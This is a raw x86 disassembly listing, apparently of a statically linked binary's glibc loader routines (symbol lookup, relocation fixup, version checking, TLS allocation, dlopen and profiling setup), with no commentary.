mov edx, esi
mov eax, dword [ebp + ebx*4 - 0x2c]
mov dword [esp], edx
inc ebx
mov dword [var_4h], eax
call fcn.080773c0
cmp ebx, 7
mov edx, eax
jbe 0x807e820
mov ecx, dword [var_5ch]
cmp byte [ecx], 0
jne 0x807e871
mov eax, dword [0x80a95a8]
mov edx, str._main_program_
mov eax, dword [eax]
test eax, eax
cmovne edx, eax
xor eax, eax
mov ecx, str.relocation_error
mov dword [esp], esi
call fcn.08081380
mov eax, dword [var_54h]
sub esp, 4
mov dword [eax], 0
jmp 0x807e6ba
mov edx, dword [var_5ch]
jmp 0x807e851
mov dword [var_sp_ch], str._dl_lookup_symbol_x
mov dword [var_8h], 0x100
mov dword [var_4h], str.dl_lookup.c
mov dword [esp], str.version_____void__0_
call fcn.0805efc0
mov eax, dword [arg_8h]
mov ecx, dword [arg_18h]
mov edx, dword [eax]
mov eax, dword [edx]
mov dword [var_68h], edx
cmp dword [eax], ecx
je 0x807e8b9
nop
lea esi, [esi]
inc esi
mov ecx, dword [arg_18h]
cmp dword [eax + esi*4], ecx
jne 0x807e8b0
mov eax, dword [var_68h]
cmp esi, dword [eax + 4]
jb 0x807e49d
mov dword [var_sp_ch], str._dl_lookup_symbol_x
mov dword [var_8h], 0xf0
mov dword [var_4h], str.dl_lookup.c
mov dword [esp], str.i____scope___r_nlist
jmp 0x807e895
mov eax, dword [arg_14h]
test eax, eax
je 0x807e48b
cmp dword [arg_14h], 1
je 0x807e48b
mov dword [var_sp_ch], str._dl_lookup_symbol_x
mov dword [var_8h], 0xe7
mov dword [var_4h], str.dl_lookup.c
mov dword [esp], str.version____void__0___flags__0__flags__DL_LOOKUP_ADD_DEPENDENCY
jmp 0x807e895
push ebp
mov ebp, esp
sub esp, 0x28
test dword [0x80aac10], 0xfffffd7f
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov ebx, edx
mov dword [var_10h], ecx
mov esi, dword [arg_8h]
mov edi, eax
jne 0x80813c8
mov eax, dword [0x80aaa0c]
test eax, eax
je 0x80813fa
mov dword [var_sp_8h], esi
mov dword [var_sp_4h], ebx
mov dword [esp], edi
call eax
mov ebx, dword [var_ch_2]
mov esi, dword [var_8h_2]
mov edi, dword [var_4h_2]
leave
ret 4
mov eax, dword [0x80aaa0c]
mov edx, str.continued
mov dword [var_sp_ch], esi
mov dword [var_sp_8h], ecx
mov dword [var_sp_4h], ebx
mov dword [esp], str._s:_error:__s:__s___s__n
test eax, eax
mov eax, str.fatal
cmove edx, eax
mov dword [var_sp_10h], edx
call fcn.08081c40
jmp 0x80813a5
mov ecx, dword [var_10h]
mov edx, ebx
mov eax, edi
mov dword [esp], esi
call fcn.08081200
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x10
lea eax, [arg_10h]
mov dword [var_4h], 0
mov dword [var_ch], eax
mov eax, dword [arg_ch]
mov dword [var_8h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08081860
leave
ret
push ebp
mov ebp, esp
sub esp, 0x14
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov esi, dword [eax + 0x21c]
mov ebx, eax
cmp esi, dword [0x80aabd4]
ja 0x807ed0e
mov edx, dword [0x80aabd0]
mov eax, dword [0x80a95a4]
mov edi, dword [ebx + 0x220]
sub eax, edx
mov dword [var_sp_4h], edx
lea ecx, [eax - 0x420]
mov eax, dword [ebx + 0x218]
add eax, edi
cmp ecx, eax
jb 0x807ed0e
mov edx, ecx
sub edx, eax
mov eax, edx
xor edx, edx
div esi
imul eax, esi
sub ecx, eax
mov eax, dword [var_sp_4h]
sub ecx, edi
add eax, ecx
test byte [ebx + 0x174], 4
mov dword [0x80aabd0], eax
mov dword [ebx + 0x224], eax
jne 0x807ed03
or byte [ebx + 0x175], 4
mov ebx, dword [var_sp_8h]
mov esi, dword [var_8h_3]
mov edi, dword [var_4h_2]
leave
ret
mov dword [esp], ebx
call dword [0x80a95bc]
jmp 0x807ecf8
mov edx, dword [ebx + 4]
xor ecx, ecx
xor eax, eax
mov dword [esp], str.cannot_allocate_memory_in_static_TLS_block
call fcn.08081200
jmp 0x807ed30
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x14
mov edx, dword [var_8h_2]
mov dword [var_8h_3], ebx
mov dword [var_4h_2], esi
mov ebx, dword gs:[8]
sub ebx, dword [edx + 0x224]
mov ecx, dword gs:[4]
mov eax, dword [edx + 0x228]
mov dword [ecx + eax*4], ebx
mov eax, dword [edx + 0x214]
mov esi, dword [edx + 0x218]
mov dword [var_sp_8h], eax
sub esi, eax
mov eax, dword [edx + 0x210]
mov dword [esp], ebx
mov dword [var_sp_4h], eax
call fcn.08053740
mov dword [var_sp_4h], 0
mov dword [var_sp_8h], esi
mov dword [esp], eax
call fcn.080536f0
mov ebx, dword [var_8h_3]
mov esi, dword [var_4h_2]
leave
ret
push ebp
mov ebp, esp
push edi
mov edi, eax
push esi
lea esi, [eax + 4]
push ebx
mov dword [eax], edx
movzx eax, byte [edx + 0x174]
and eax, 0xffffff9f
or eax, 0x20
mov byte [edx + 0x174], al
mov eax, dword [edx + 0x1d8]
test eax, eax
je 0x8080276
mov edx, dword [eax + 4]
lea ebx, [eax + 4]
test edx, edx
je 0x8080276
test byte [edx + 0x174], 0x60
je 0x8080282
add ebx, 4
mov edx, dword [ebx]
test edx, edx
jne 0x8080264
sub esi, edi
sar esi, 2
pop ebx
mov eax, esi
pop esi
pop edi
leave
ret
mov eax, esi
call fcn.08080230
lea esi, [esi + eax*4]
jmp 0x808026d
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1c
mov ecx, dword [0x80aaa14]
test ecx, ecx
je 0x8082e18
mov ecx, dword [0x80aaa30]
mov edx, dword [0x80aaa34]
mov eax, 0
sub dword [arg_8h], ecx
cmp dword [arg_8h], edx
cmovb eax, dword [arg_8h]
sub dword [arg_ch], ecx
cmp dword [arg_ch], edx
mov dword [arg_8h], eax
jae 0x8082e18
mov ecx, dword [0x80aaa38]
mov eax, dword [arg_ch]
mov edx, dword [0x80aaa20]
shr eax, cl
lea eax, [edx + eax*2]
mov dword [var_1ch], edx
mov dword [var_18h], eax
movzx eax, word [eax]
movzx eax, ax
test eax, eax
je 0x8082d03
mov esi, dword [0x80aaa24]
lea ebx, [esi + eax*8]
mov edx, dword [ebx]
mov eax, dword [edx]
cmp eax, dword [arg_8h]
je 0x8082e14
movzx ecx, word [ebx + 4]
test cx, cx
je 0x8082cf2
movzx eax, cx
lea ebx, [esi + eax*8]
movzx eax, word [ebx + 4]
test ax, ax
mov ecx, eax
je 0x8082e2e
mov edx, dword [ebx]
mov eax, dword [edx]
cmp eax, dword [arg_8h]
jne 0x8082cd4
mov eax, dword [edx]
cmp eax, dword [arg_8h]
je 0x8082e14
add ebx, 4
mov dword [var_18h], ebx
mov ebx, dword [0x80aaa1c]
mov edx, dword [0x80aaa18]
mov dword [var_24h], ebx
mov esi, dword [var_24h]
mov ebx, edx
mov eax, dword [esi]
cmp edx, eax
je 0x8082d9b
mov eax, dword [0x80aaa28]
cmp edx, eax
mov dword [var_28h], eax
jae 0x8082d9b
mov ecx, dword [0x80aaa10]
mov esi, dword [0x80aaa24]
mov edi, 1
mov dword [var_20h], ecx
lea eax, [edx + edx*2]
mov edx, dword [var_20h]
mov ecx, dword [edx + eax*4 + 4]
mov eax, edi
shr ecx, 2
lock xadd dword [0x80aaa2c], eax
mov dword [var_10h], eax
mov eax, dword [var_10h]
mov edx, dword [var_10h]
lea eax, [ebx + ebx*2]
inc edx
mov ebx, dword [var_20h]
lea eax, [ebx + eax*4]
mov ebx, dword [var_1ch]
mov dword [esi + edx*8], eax
movzx eax, word [ebx + ecx*2]
mov word [esi + edx*8 + 4], ax
mov word [ebx + ecx*2], dx
lock inc dword [0x80aaa18]
mov edx, dword [0x80aaa18]
mov ecx, dword [var_24h]
mov eax, dword [ecx]
mov ebx, edx
cmp edx, eax
je 0x8082d9b
cmp edx, dword [var_28h]
jb 0x8082d41
mov ebx, dword [var_18h]
movzx eax, word [ebx]
test ax, ax
jne 0x8082e20
mov eax, 1
mov esi, dword [var_24h]
mov ecx, eax
lock xadd dword [esi], ecx
cmp ecx, dword [0x80aaa28]
jae 0x8082e18
lock xadd dword [0x80aaa2c], eax
mov dword [var_14h], eax
mov eax, dword [var_14h]
mov eax, dword [var_14h]
mov esi, dword [arg_8h]
mov edx, dword [0x80aaa24]
inc eax
mov word [ebx], ax
movzx eax, word [ebx]
movzx eax, ax
lea ebx, [edx + eax*8]
mov edx, dword [0x80aaa10]
lea eax, [ecx + ecx*2]
shl eax, 2
mov word [ebx + 4], 0
lea ecx, [eax + edx]
mov dword [ecx], esi
mov dword [ebx], ecx
mov esi, dword [arg_ch]
mov dword [edx + eax + 8], 0
mov dword [edx + eax + 4], esi
lock inc dword [0x80aaa18]
mov edx, ecx
lock inc dword [edx + 8]
add esp, 0x1c
pop ebx
pop esi
pop edi
leave
ret
mov edx, dword [var_18h]
movzx eax, word [edx]
movzx eax, ax
jmp 0x8082cb5
mov edx, dword [ebx]
jmp 0x8082cf2
push ebp
mov ebp, esp
push edi
push esi
mov esi, eax
push ebx
sub esp, 0x28
mov ecx, dword [eax + 0x30]
mov eax, dword [eax + 0x2c]
mov eax, dword [eax + 4]
mov dword [var_14h], eax
mov eax, dword [esi + 0x74]
add edx, dword [eax + 4]
mov eax, dword [edx + 4]
mov edx, dword [edx]
mov ebx, eax
shr ebx, 8
mov dword [var_18h], ebx
shl ebx, 4
add ebx, dword [ecx + 4]
mov ecx, dword [esi]
add edx, ecx
mov dword [var_10h], ebx
cmp al, 7
mov dword [var_1ch], edx
jne 0x8081024
movzx eax, byte [ebx + 0xd]
mov edi, ebx
and eax, 3
mov dword [var_20h], eax
jne 0x808101d
mov edx, dword [esi + 0xdc]
xor eax, eax
test edx, edx
je 0x8080fb3
mov eax, dword [edx + 4]
mov edx, dword [var_18h_2]
movzx eax, word [eax + edx*2]
and ax, 0x7fff
movzx eax, ax
shl eax, 4
add eax, dword [esi + 0x17c]
mov ecx, dword [eax + 4]
test ecx, ecx
cmove eax, dword [var_20h]
mov ebx, dword [edi]
lea ecx, [var_10h_2]
mov edx, esi
mov dword [var_4h], eax
add dword [var_14h_2], ebx
mov dword [esp + 0x10], 0
mov eax, dword [esi + 0x1b4]
mov dword [var_ch], 1
mov dword [var_8h], 1
mov dword [esp], eax
mov eax, dword [var_14h_2]
call fcn.0807e450
mov edx, dword [var_10h_2]
sub esp, 0x14
mov ecx, eax
xor eax, eax
test edx, edx
je 0x8081001
test ecx, ecx
je 0x8081018
mov eax, dword [edx + 4]
add eax, dword [ecx]
mov edx, dword [0x80aac30]
test edx, edx
jne 0x8081010
mov edx, dword [var_1ch_2]
mov dword [edx], eax
lea esp, [var_bp_ch]
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [edx + 4]
jmp 0x8081001
mov eax, ecx
add eax, dword [ebx + 4]
jmp 0x8081001
mov dword [var_ch], 0x80a4678
mov dword [var_8h], 0x4c
mov dword [var_4h], str.dl_runtime.c
mov dword [esp], str.__reloc__r_info___0xff___7
call fcn.0805efc0
nop
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
mov esi, eax
push ebx
mov ebx, edx
shr edx, 3
sub esp, 0x28
mov eax, dword [eax + 0x188]
mov dword [var_14h_2], ecx
lea edx, [eax + edx*4]
mov edi, dword [edx]
mov dword [var_18h_2], edx
test edi, edi
jne 0x808113a
mov eax, dword [esi + 0x2c]
mov edx, dword [esi + 0x30]
mov eax, dword [eax + 4]
mov dword [var_1ch_2], eax
mov eax, dword [esi + 0x74]
add ebx, dword [eax + 4]
mov eax, dword [ebx + 4]
mov ecx, eax
shr ecx, 8
mov dword [var_20h], ecx
shl ecx, 4
add ecx, dword [edx + 4]
cmp al, 7
mov dword [var_10h_2], ecx
jne 0x808115f
test byte [ecx + 0xd], 3
mov ebx, ecx
jne 0x8081158
mov edx, dword [esi + 0xdc]
xor eax, eax
test edx, edx
je 0x80810e1
mov eax, dword [edx + 4]
mov edx, dword [var_20h]
movzx eax, word [eax + edx*2]
and ax, 0x7fff
movzx eax, ax
shl eax, 4
add eax, dword [esi + 0x17c]
mov edx, dword [eax + 4]
test edx, edx
cmove eax, edi
mov ecx, dword [ebx]
mov edx, esi
mov dword [var_4h_2], eax
mov eax, dword [esi + 0x1b4]
add dword [var_1ch_2], ecx
mov dword [var_sp_10h], 0
lea ecx, [var_10h_2]
mov dword [var_ch_2], 1
mov dword [var_8h_2], 1
mov dword [esp], eax
mov eax, dword [var_1ch_2]
call fcn.0807e450
mov edx, dword [var_10h_2]
sub esp, 0x14
test edx, edx
je 0x808112b
test eax, eax
je 0x8081153
mov edi, dword [edx + 4]
add edi, dword [eax]
mov ebx, dword [0x80aac30]
test ebx, ebx
jne 0x808113a
mov eax, dword [var_18h_2]
mov dword [eax], edi
mov edx, dword [var_14h_2]
mov dword [var_4h_2], edi
mov dword [esp], edx
call fcn.08082c50
lea esp, [var_bp_ch]
mov eax, edi
pop ebx
pop esi
pop edi
leave
ret
mov edi, dword [edx + 4]
jmp 0x808112b
mov edi, dword [ecx + 4]
add edi, dword [esi]
jmp 0x808112b
mov dword [var_ch_2], str.profile_fixup
mov dword [var_8h_2], 0xa0
mov dword [var_4h_2], str.dl_runtime.c
mov dword [esp], str.__reloc__r_info___0xff___7
call fcn.0805efc0
lea esi, [esi]
lea edi, [edi]
push eax
push ecx
push edx
mov edx, dword [var_4h_2]
mov eax, dword [var_ch_3]
call fcn.08080f30
pop edx
pop ecx
xchg dword [esp], eax
ret 8
push ebp
mov ebp, esp
sub esp, 0x14
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov ebx, dword [arg_ch]
mov esi, dword [arg_8h]
mov dword [var_sp_4h], ebx
mov dword [esp], esi
call fcn.08084b00
mov eax, dword [esi + 0x18]
test eax, eax
jne 0x8084ac0
mov eax, 1
test ebx, ebx
mov dword [esp], esi
cmovne eax, ebx
mov dword [var_sp_4h], eax
call fcn.08084ae0
nop
lea esi, [esi]
lea eax, [esi + 0x1c]
mov dword [var_sp_8h], 0
mov dword [esp], 2
mov dword [var_sp_4h], eax
call fcn.08049180
jmp 0x8084aa5
mov edx, dword [0x80aad38]
push ebp
mov ebp, esp
test edx, edx
jne 0x80817a0
mov dword [0x80aad40], eax
mov dword [0x80aad30], 1
mov dword [0x80aad38], 0x80817b0
mov eax, dword [0x80aac58]
mov dword [0x80aad34], eax
mov eax, 0x80aad30
leave
ret
push ebp
mov ebp, esp
sub esp, 0x18
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov ebx, dword [arg_8h]
movzx eax, byte [ebx + 0x174]
test al, 8
jne 0x8081584
mov edx, eax
mov eax, dword [ebx + 4]
or edx, 8
mov byte [ebx + 0x174], dl
movzx ecx, byte [eax]
test cl, cl
je 0x808161e
mov edx, dword [ebx + 0x48]
test edx, edx
jne 0x808158f
mov esi, dword [ebx + 0x7c]
test esi, esi
jne 0x808158f
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
test byte [0x80aac10], 2
jne 0x80815fb
test edx, edx
jne 0x80815de
mov edx, dword [ebx + 0x7c]
test edx, edx
je 0x8081584
mov eax, dword [ebx + 0x84]
mov edi, dword [ebx]
xor ebx, ebx
add edi, dword [edx + 4]
mov esi, dword [eax + 4]
shr esi, 2
cmp ebx, esi
jae 0x8081584
lea esi, [esi]
mov eax, dword [arg_14h]
mov edx, dword [arg_10h]
mov dword [var_sp_8h], eax
mov dword [var_sp_4h], edx
mov eax, dword [arg_ch]
mov dword [esp], eax
call dword [edi + ebx*4]
inc ebx
cmp ebx, esi
jb 0x80815c0
jmp 0x8081584
mov eax, dword [edx + 4]
mov edx, dword [arg_14h]
add eax, dword [ebx]
mov dword [var_sp_8h], edx
mov edx, dword [arg_10h]
mov dword [var_sp_4h], edx
mov edx, dword [arg_ch]
mov dword [esp], edx
call eax
jmp 0x808159c
test cl, cl
jne 0x8081606
mov eax, dword [0x80a95a8]
mov eax, dword [eax]
mov dword [var_sp_4h], eax
mov dword [esp], str._ncalling_init:__s_n_n
call fcn.08081c40
mov edx, dword [ebx + 0x48]
jmp 0x8081598
and edx, 3
test dl, dl
je 0x8081584
jmp 0x8081576
push ebp
mov ebp, esp
push edi
mov edi, edx
push esi
mov esi, ecx
push ebx
sub esp, 0xb0
test byte [0x80aac10], 0x10
mov edx, dword [arg_8h]
mov dword [var_a0h], eax
mov eax, dword [edx + 0x2c]
mov eax, dword [eax + 4]
mov dword [var_a8h], 0
mov dword [var_a4h], eax
jne 0x8082034
mov edx, dword [arg_8h]
mov eax, dword [edx + 0xac]
test eax, eax
je 0x8081fc3
mov eax, dword [eax + 4]
test eax, eax
je 0x8082066
mov edx, dword [var_4h]
mov ebx, dword [edx]
add ebx, eax
cmp word [ebx], 1
jne 0x8081f29
cmp edi, dword [ebx + 8]
je 0x8081f01
mov eax, dword [ebx + 0x10]
test eax, eax
jne 0x8081d9d
mov edx, dword [var_ch]
test edx, edx
je 0x8081e71
mov eax, dword [var_8h]
xor edx, edx
test eax, eax
jne 0x8081ddc
lea esi, [esi]
lea esp, [var_bp_ch]
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret 0xc
mov eax, dword [var_a0h_2]
mov dword [var_78h], esi
mov dword [var_7ch], str.weak_version__
mov dword [var_74h], str._not_found__required_by_
mov dword [var_6ch], 0x8092e9e
mov esi, 1
xor ebx, ebx
mov dword [var_70h], eax
mov eax, dword [ebp + ebx*4 - 0x7c]
inc ebx
mov dword [esp], eax
call fcn.08053400
add esi, eax
cmp ebx, 4
jbe 0x8081e04
lea eax, [esi + 0x12]
xor ebx, ebx
and eax, 0xfffffffc
sub esp, eax
lea esi, [var_23h]
and esi, 0xfffffff0
mov edx, esi
mov eax, dword [ebp + ebx*4 - 0x7c]
mov dword [esp], edx
inc ebx
mov dword [var_4h], eax
call fcn.080773c0
cmp ebx, 4
mov edx, eax
mov ecx, esi
jbe 0x8081e2b
mov eax, dword [arg_8h]
mov edx, dword [eax + 4]
cmp byte [edx], 0
jne 0x8081e57
mov eax, dword [0x80a95a8]
mov edx, dword [eax]
mov dword [esp], ecx
xor eax, eax
xor ecx, ecx
call fcn.08081380
sub esp, 4
mov edx, dword [var_a8h]
jmp 0x8081dd0
mov edx, dword [var_a0h_2]
mov dword [var_98h], esi
mov dword [var_9ch], 0x80a47b5
mov dword [var_94h], str._not_found__required_by_
mov dword [var_8ch], 0x8092e9e
mov esi, 1
xor ebx, ebx
mov dword [var_90h], edx
mov eax, dword [ebp + ebx*4 - 0x9c]
inc ebx
mov dword [esp], eax
call fcn.08053400
add esi, eax
cmp ebx, 4
jbe 0x8081ea8
lea eax, [esi + 0x12]
xor ebx, ebx
and eax, 0xfffffffc
sub esp, eax
lea esi, [var_23h]
and esi, 0xfffffff0
mov edx, esi
mov eax, dword [ebp + ebx*4 - 0x9c]
mov dword [esp], edx
inc ebx
mov dword [var_4h], eax
call fcn.080773c0
cmp ebx, 4
mov edx, eax
jbe 0x8081ed2
lea esi, [esi]
mov ecx, esi
mov dword [var_a8h_2], 1
jmp 0x8081e45
mov eax, ebx
mov edx, dword [var_a4h_2]
add eax, dword [ebx + 0xc]
add edx, dword [eax]
mov dword [esp], esi
mov dword [var_4h], edx
call fcn.08076e50
xor edx, edx
test eax, eax
je 0x8081dd0
jmp 0x8081db2
lea eax, [var_29h]
mov byte [var_29h], 0
mov dword [var_10h], 0
mov dword [var_ch], 0xa
mov dword [var_8h], eax
mov dword [var_5ch], str.unsupported_version_
movzx eax, word [ebx]
mov esi, 1
xor ebx, ebx
mov dword [var_4h], 0
mov dword [esp], eax
call fcn.08063ca0
mov dword [var_44h], str._of_Verdef_record
mov edx, dword [var_5ch]
mov dword [var_58h], eax
mov dword [var_54h], str._of_Verdef_record
mov dword [var_48h], eax
mov dword [var_4ch], edx
mov eax, dword [ebp + ebx*4 - 0x4c]
inc ebx
mov dword [esp], eax
call fcn.08053400
add esi, eax
cmp ebx, 2
jbe 0x8081f7f
lea eax, [esi + 0x12]
xor ebx, ebx
and eax, 0xfffffffc
sub esp, eax
lea esi, [var_23h]
and esi, 0xfffffff0
mov edx, esi
mov eax, dword [ebp + ebx*4 - 0x4c]
mov dword [esp], edx
inc ebx
mov dword [var_4h], eax
call fcn.080773c0
cmp ebx, 2
mov edx, eax
jbe 0x8081fa6
jmp 0x8081ef0
mov ecx, dword [arg_ch]
xor edx, edx
test ecx, ecx
je 0x8081dd0
mov eax, dword [var_a0h]
mov dword [var_1ch], str.no_version_information_available__required_by_
mov dword [var_14h], 0x8092e9e
mov esi, 1
xor ebx, ebx
mov dword [var_18h], eax
mov eax, dword [ebp + ebx*4 - 0x1c]
inc ebx
mov dword [esp], eax
call fcn.08053400
add esi, eax
cmp ebx, 2
jbe 0x8081fee
lea eax, [esi + 0x12]
xor ebx, ebx
and eax, 0xfffffffc
sub esp, eax
lea esi, [var_23h]
and esi, 0xfffffff0
mov edx, esi
mov eax, dword [ebp + ebx*4 - 0x1c]
mov dword [esp], edx
inc ebx
mov dword [var_4h], eax
call fcn.080773c0
cmp ebx, 2
mov edx, eax
mov ecx, esi
jbe 0x8082015
jmp 0x8081e45
mov eax, dword [var_a0h]
mov dword [var_ch], eax
mov eax, dword [edx + 4]
cmp byte [eax], 0
jne 0x808204d
mov eax, dword [0x80a95a8]
mov eax, dword [eax]
mov dword [var_8h], eax
mov dword [var_4h], esi
mov dword [esp], str.checking_for_version___s_in_file__s_required_by_file__s_n
call fcn.08081c40
jmp 0x8081d7c
mov dword [var_ch], str.match_symbol
mov dword [var_8h], 0x70
mov dword [var_4h], str.dl_version.c
mov dword [esp], str.def_offset___0
call fcn.0805efc0
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x20
mov eax, dword [0x80aac44]
mov dword [var_4h], ebx
test eax, eax
je 0x8090d17
mov ebx, dword [var_4h]
leave
ret
lea ebx, [var_14h]
mov dword [var_14h], 0
mov dword [var_10h], 1
mov dword [var_ch], 0
mov dword [var_8h], 0
mov dword [var_sp_8h], 0
mov dword [var_sp_4h], ebx
mov dword [esp], 0
call fcn.080919f0
mov dword [var_sp_8h], ebx
mov dword [var_sp_4h], 0
mov dword [esp], 0
call fcn.080919f0
xor eax, eax
mov edx, dword [var_10h]
cmp edx, 1
jle 0x8090d12
mov eax, 0xf4240
mov ecx, edx
cdq
idiv ecx
jmp 0x8090d12
push ebp
mov ebp, esp
push esi
push ebx
sub esp, 0xac
mov ebx, dword [arg_ch]
mov esi, dword [arg_8h]
test esi, esi
je 0x8090c84
mov eax, dword [0x80aabbc]
test eax, eax
jne 0x8090c39
mov eax, dword [arg_10h]
shr ebx, 1
mov dword [0x80aabbc], esi
mov dword [0x80aabc0], ebx
mov dword [var_98h], fcn.08090b10
mov dword [var_14h], 0x10000000
lea edx, [var_94h]
mov dword [0x80aabc4], eax
mov eax, dword [arg_14h]
mov dword [0x80aabc8], eax
mov eax, 0x1f
mov dword [edx + eax*4], 0xffffffff
dec eax
jns 0x8090bb0
lea eax, [var_98h]
mov dword [var_8h], 0x80aab20
mov dword [esp], 0x1b
mov dword [var_4h], eax
call fcn.08049140
mov edx, 0xffffffff
test eax, eax
js 0x8090c2d
mov dword [var_a0h], 0
mov dword [var_9ch], 1
mov dword [var_8h], 0x80aabac
mov eax, dword [var_a0h]
mov edx, dword [var_9ch]
mov dword [esp], 2
mov dword [var_a8h], eax
mov dword [var_a4h], edx
lea eax, [var_a8h]
mov dword [var_4h], eax
call fcn.080919f0
mov edx, eax
add esp, 0xac
mov eax, edx
pop ebx
pop esi
leave
ret
mov dword [var_8h], 0
mov dword [var_4h], 0x80aabac
mov dword [esp], 2
call fcn.080919f0
test eax, eax
js 0x8090c7d
mov dword [var_8h], 0
mov dword [var_4h], 0x80aab20
mov dword [esp], 0x1b
call fcn.08049140
test eax, eax
jns 0x8090b76
mov edx, 0xffffffff
jmp 0x8090c2d
mov edx, dword [0x80aabbc]
test edx, edx
jne 0x8090c92
xor edx, edx
jmp 0x8090c2d
mov dword [var_8h], 0
mov dword [var_4h], 0x80aabac
mov dword [esp], 2
call fcn.080919f0
mov edx, 0xffffffff
test eax, eax
js 0x8090c2d
mov dword [var_8h], 0
mov dword [var_4h], 0x80aab20
mov dword [esp], 0x1b
mov dword [0x80aabbc], 0
call fcn.08049140
jmp 0x8090c2b
push ebp
mov ebp, esp
sub esp, 0x10
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov dword [var_sp_4h], 4
mov ebx, eax
mov eax, dword [0x80aabd8]
lea esi, [eax + 0xe]
add eax, 0x10
mov dword [esp], eax
call fcn.08051730
test eax, eax
je 0x8082f9f
mov dword [eax], esi
add eax, 4
mov dword [ebx + 4], eax
mov eax, ebx
mov esi, dword [var_4h]
mov ebx, dword [var_8h]
leave
ret
xor ebx, ebx
jmp 0x8082f95
push ebp
mov ebp, esp
sub esp, 0x18
mov eax, dword [0x80aabd4]
mov dword [var_8h], esi
mov dword [var_ch], ebx
mov dword [var_4h], edi
mov esi, dword [0x80a95a4]
mov dword [esp], eax
mov dword [var_sp_4h], esi
call fcn.080513d0
test eax, eax
mov ebx, eax
mov edi, eax
je 0x808302a
lea ebx, [esi + eax - 0x420]
mov dword [var_sp_8h], 0x420
mov dword [var_sp_4h], 0
mov dword [esp], ebx
call fcn.080536f0
mov eax, ebx
call fcn.08082f60
test eax, eax
mov ebx, eax
je 0x8083037
mov eax, ebx
mov esi, dword [var_8h]
mov edi, dword [var_4h]
mov ebx, dword [var_ch]
leave
ret
mov dword [esp], edi
call fcn.08051180
jmp 0x808302a
push ebp
mov ebp, esp
push edi
mov edi, eax
push esi
mov esi, ecx
push ebx
mov ebx, edx
sub esp, 0x4c
test dl, 3
je 0x805548c
mov eax, 0
test eax, eax
je 0x805535d
mov dword [esp], 0x80a95d4
call section.
mov eax, dword [var_4h_2]
mov ecx, 0x8054c60
lea edx, [var_3ch]
mov dword [var_38h_2], edi
mov dword [var_34h_2], ebx
mov dword [var_30h_2], esi
mov dword [var_28h_2], 0
mov dword [var_2ch_2], eax
lea eax, [var_38h_2]
mov dword [esp], eax
lea eax, [var_40h]
call fcn.08081410
sub esp, 4
mov dword [var_44h], eax
call fcn.0807de70
mov eax, 0
test eax, eax
je 0x80553a9
mov dword [esp], 0x80a95d4
call section.
mov ebx, dword [var_3ch]
test ebx, ebx
jne 0x80553bb
mov eax, dword [var_28h_2]
lea esp, [ebp - 0xc]
pop ebx
pop esi
pop edi
leave
ret
mov ecx, dword [var_28h_2]
test ecx, ecx
je 0x8055403
mov ebx, dword [ecx + 0x150]
mov eax, dword [ebx]
mov esi, dword [eax + 0x170]
test esi, esi
jne 0x80553f2
mov eax, dword [ecx + 0x154]
xor edx, edx
cmp edx, eax
jae 0x80553f2
mov esi, ebx
mov ebx, eax
mov eax, dword [esi + edx*4]
inc edx
inc dword [eax + 0x170]
cmp edx, ebx
jb 0x80553e4
mov eax, ecx
mov byte [0x80aabe0], 1
call fcn.08055790
mov ebx, dword [var_3ch]
mov dword [esp], ebx
call fcn.08053400
mov edx, dword [var_40h]
lea edi, [eax + 1]
mov ecx, eax
lea eax, [edi + ebx]
cmp edx, eax
je 0x805545a
lea eax, [ecx + 0x10]
and eax, 0xfffffff0
sub esp, eax
lea esi, [var_ch_2]
mov dword [esp + 8], edi
mov dword [var_4h_3], ebx
mov dword [esp], esi
call fcn.08053770
mov eax, dword [var_3ch]
cmp eax, str.out_of_memory
jne 0x8055450
mov edx, dword [var_40h]
mov dword [esp], esi
xor ecx, ecx
mov eax, dword [var_44h]
call fcn.08081200
mov dword [esp], eax
call fcn.08051180
jmp 0x8055440
mov dword [esp], edx
call fcn.08053400
lea eax, [eax + edi]
lea edx, [eax + 1]
add eax, 0x10
and eax, 0xfffffff0
sub esp, eax
lea esi, [var_ch_2]
mov dword [esp + 8], edx
mov dword [var_4h_3], ebx
mov dword [esp], esi
call fcn.08053770
lea eax, [edi + esi]
mov dword [var_40h], eax
jmp 0x8055436
mov edx, eax
xor ecx, ecx
mov dword [esp], str.invalid_mode_for_dlopen__
mov eax, 0x16
jmp 0x805544b
push ebp
xor eax, eax
mov ebp, esp
push edi
mov ecx, dword [arg_ch]
mov edi, dword [arg_8h]
push esi
push ebx
cmp edi, ecx
je 0x808dd0d
movzx esi, byte [edi]
mov eax, esi
movzx edx, al
mov eax, dword [arg_10h]
mov ebx, dword [eax + 0x38]
movzx eax, byte [ecx]
inc ecx
mov edx, dword [ebx + edx*4]
sub edx, dword [ebx + eax*4]
mov eax, edx
jne 0x808dd0d
mov esi, esi
mov edx, esi
inc edi
test dl, dl
je 0x808dd0d
movzx esi, byte [edi]
mov edx, esi
movzx eax, dl
mov edx, dword [ebx + eax*4]
movzx eax, byte [ecx]
inc ecx
sub edx, dword [ebx + eax*4]
mov eax, edx
je 0x808dcf0
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
mov ebx, eax
sub esp, 0x1c
mov eax, dword [eax]
mov dword [var_10h], 1
test eax, eax
je 0x80848ac
mov eax, 0
test eax, eax
je 0x80846e1
mov dword [esp], 0x80aaa48
call section.
mov dword [var_8h], fcn.080845a0
mov dword [var_4h], 0x80aaa44
mov dword [esp], ebx
call fcn.0807a2c0
test eax, eax
mov edi, eax
je 0x8084773
mov edx, dword [eax]
mov eax, dword [edx + 0x24]
test eax, eax
je 0x8084712
inc eax
je 0x8084732
mov dword [var_10h_2], 0
mov eax, 0
